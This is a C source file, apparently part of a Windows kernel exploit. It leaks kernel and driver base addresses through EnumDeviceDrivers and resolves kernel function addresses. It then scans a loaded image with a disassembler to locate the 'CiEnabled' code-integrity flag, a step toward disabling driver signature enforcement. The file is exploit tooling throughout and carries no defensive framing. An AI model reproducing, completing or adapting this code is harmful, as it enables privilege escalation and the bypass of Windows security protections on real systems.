#include "sysret.h"
#include "log.h"
#include "sources\include\beaengine\BeaEngine.h"

BOOL
GetDriverImageBase( 
	OUT PULONG_PTR DriverBase, 
	IN PCHAR DriverName
	)
{
	LPVOID DriverList[1024];
	CHAR szDriver[MAX_PATH];
	DWORD dwNeededSize;
	DWORD dwDrivers, i;
	ERRORINFO err;

	if( EnumDeviceDrivers(DriverList, sizeof(DriverList), &dwNeededSize) && dwNeededSize < sizeof(DriverList))
	{ 
		dwDrivers = dwNeededSize / sizeof(DriverList[0]); 
		for ( i = 0; i < dwDrivers; i++ )
		{
			if( GetDeviceDriverBaseName(DriverList[i], szDriver, sizeof(szDriver)/sizeof(szDriver[0])) )
			{
				if(strstr(szDriver, DriverName))
				{
					DEBUG_PRINTF(L_INFO,"Driver Executive Entry (%s) at : %p", szDriver, DriverList[i]);
					*DriverBase = (ULONG_PTR)DriverList[i];
					return TRUE;
				}
			}
		}
	}
	else 
		REPORT_ERROR( "EnumDeviceDrivers()", &err);

	return FALSE;
}

ULONG_PTR
KernelGetProcAddress(
	IN ULONG_PTR UserKernelBase, 
	IN ULONG_PTR RealKernelBase, 
	IN LPCSTR SymName
	)
{

  ULONG_PTR ProcAddress = (ULONG_PTR)GetProcAddress((HMODULE)UserKernelBase, SymName);
  if(ProcAddress == NULL)
	  return NULL;

  ProcAddress -= UserKernelBase;
  ProcAddress += RealKernelBase;
  return ProcAddress;
}

BOOL
GetKernelBaseInfo(
	OUT PULONG_PTR kernelBase, 
    IN OUT PCHAR kernelImage, 
	IN UINT Size
	)
{
	LPVOID DriverList[1024];
	CHAR szDriver[MAX_PATH];
	DWORD dwNeededSize;
	ERRORINFO err;

	if( EnumDeviceDrivers(DriverList, sizeof(DriverList), &dwNeededSize) && dwNeededSize < sizeof(DriverList))
	{ 
		if( GetDeviceDriverBaseName(DriverList[0], szDriver, sizeof(szDriver)/sizeof(szDriver[0])) )
		{
			DEBUG_PRINTF(L_INFO,"Kernel Executive Entry (%s) at : %p", szDriver, DriverList[0]);
			*kernelBase = (ULONG_PTR)DriverList[0];
			strncpy( kernelImage, szDriver, Size);
			return TRUE;
		}
	}
	else 
		REPORT_ERROR( "EnumDeviceDrivers()", &err);

  return TRUE;
}

ULONG_PTR
GetCiEnabledAddress(
	IN HMODULE hModule
	)
{
	// this function is actualy pice of shit but works fine :O
	// sub     rsp, 38h
	// cmp     XXX, 0h
	BYTE SeValidateSig[] = { 0x48, 0x83, 0xEC, 0x38, 0x80 };
	DISASM MyDisasm;
	CHAR Inst[100];
	CHAR temp[100];
	LONGLONG CiEnabled = NULL;
	BOOL bCiEnable = FALSE;
	BOOL bCallR10 = FALSE;
	BOOL bEpilog = FALSE;
    int len, i = 0; 
    int Error = 0; 

	while ( TRUE )
	{
		if ( !memcmp( hModule, SeValidateSig, 5 ) )
		{
			SecureZeroMemory(&MyDisasm, sizeof(DISASM)); 
			MyDisasm.Archi = 64;
			MyDisasm.EIP = (UIntPtr) (hModule); 

			while ( ( !Error ) && ( i < 500 ))
			{ 
				len = Disasm(&MyDisasm); 
				if ( len != UNKNOWN_OPCODE ) 
				{ 
					MyDisasm.EIP = MyDisasm.EIP + (UIntPtr)len; 
					i++;
					if ( bCiEnable == FALSE )
					{
						CHAR *c = strchr(MyDisasm.CompleteInstr, '[');
						if ( c != NULL )
						{
							strcpy(temp,c+1);
							c = strchr(temp, 'h');
							*c = '\0';
							sscanf(( LPCTSTR )temp, "%I64X", &CiEnabled );
							bCiEnable = TRUE;
						}
					}

					if ( strstr( MyDisasm.CompleteInstr, "add rsp, 38h") )
					{
						bEpilog = TRUE;
						break;
					}
					else if ( strstr( MyDisasm.CompleteInstr, "call r10") )
					{
						bCallR10 = TRUE;
					}
				} 
				else
					Error = 1; 
			}
		}

		if ( bEpilog && bCallR10 && bCiEnable )
			break;

		bEpilog = bCallR10 = bCiEnable = FALSE;
		hModule++;
		i = 0;
	}

	return CiEnabled;
}

